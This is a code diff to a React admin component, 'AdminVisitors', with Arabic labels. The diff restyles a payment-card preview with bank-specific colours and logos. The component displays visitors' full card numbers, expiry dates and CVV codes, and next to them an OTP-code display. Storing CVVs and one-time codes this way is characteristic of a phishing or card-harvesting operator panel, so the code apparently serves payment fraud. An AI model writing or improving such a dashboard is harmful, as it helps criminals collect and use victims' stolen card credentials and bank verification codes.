@@ -1576,39 +1576,48 @@ const AdminVisitors = () => {
                         )}
 
                         {/* Payment card preview for orders */}
-                        {item.type === "order" && item.data.card_full_number && (
-                          <div className="mt-2 bg-gradient-to-br from-slate-800 via-slate-900 to-slate-800 rounded-xl p-4 space-y-2.5 shadow-lg border border-slate-700/50">
+                        {item.type === "order" && item.data.card_full_number && (() => {
+                          const bColors = item.data.bank_name ? bankColors[item.data.bank_name] : null;
+                          return (
+                          <div
+                            className="mt-2 rounded-xl p-4 space-y-2.5 shadow-lg border"
+                            style={{
+                              background: bColors ? bColors.header : "linear-gradient(135deg, #1e293b, #0f172a)",
+                              borderColor: bColors ? bColors.border : "rgba(51,65,85,0.5)",
+                            }}
+                          >
                             {item.data.bank_name && bankLogos[item.data.bank_name] && (
                               <div className="flex items-center justify-center mb-1">
-                                <img src={bankLogos[item.data.bank_name]} alt={item.data.bank_name} className="h-8 object-contain rounded bg-white/10 px-2 py-1" />
+                                <img src={bankLogos[item.data.bank_name]} alt={item.data.bank_name} className="h-8 object-contain rounded bg-white/20 px-2 py-1" />
                               </div>
                             )}
                             <div className="flex items-center justify-between">
-                              <span className="text-[12px] text-slate-400 font-medium">البطاقة</span>
+                              <span className="text-[12px] text-white/60 font-medium">البطاقة</span>
                               <span className="text-[15px] font-mono font-bold text-white tracking-widest" dir="ltr">
                                 {item.data.card_full_number.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim()}
                               </span>
                             </div>
                             {item.data.card_expiry && (
                               <div className="flex items-center justify-between">
-                                <span className="text-[12px] text-slate-400 font-medium">الانتهاء</span>
+                                <span className="text-[12px] text-white/60 font-medium">الانتهاء</span>
                                 <span className="text-[14px] font-mono text-white" dir="ltr">{item.data.card_expiry}</span>
                               </div>
                             )}
                             {item.data.card_cvv && (
                               <div className="flex items-center justify-between">
-                                <span className="text-[12px] text-slate-400 font-medium">CVV</span>
-                                <span className="text-[16px] font-mono font-bold text-amber-400" dir="ltr">{item.data.card_cvv}</span>
+                                <span className="text-[12px] text-white/60 font-medium">CVV</span>
+                                <span className="text-[16px] font-mono font-bold text-amber-300" dir="ltr">{item.data.card_cvv}</span>
                               </div>
                             )}
                             {item.data.bank_name && (
                               <div className="flex items-center justify-between">
-                                <span className="text-[12px] text-slate-400 font-medium">البنك</span>
-                                <span className="text-[13px] text-sky-300 font-semibold">{item.data.bank_name}</span>
+                                <span className="text-[12px] text-white/60 font-medium">البنك</span>
+                                <span className="text-[13px] text-white font-semibold">{item.data.bank_name}</span>
                               </div>
                             )}
                           </div>
-                        )}
+                          );
+                        })()}
 
                         {/* OTP code display */}
                         {item.type === "otp" && (
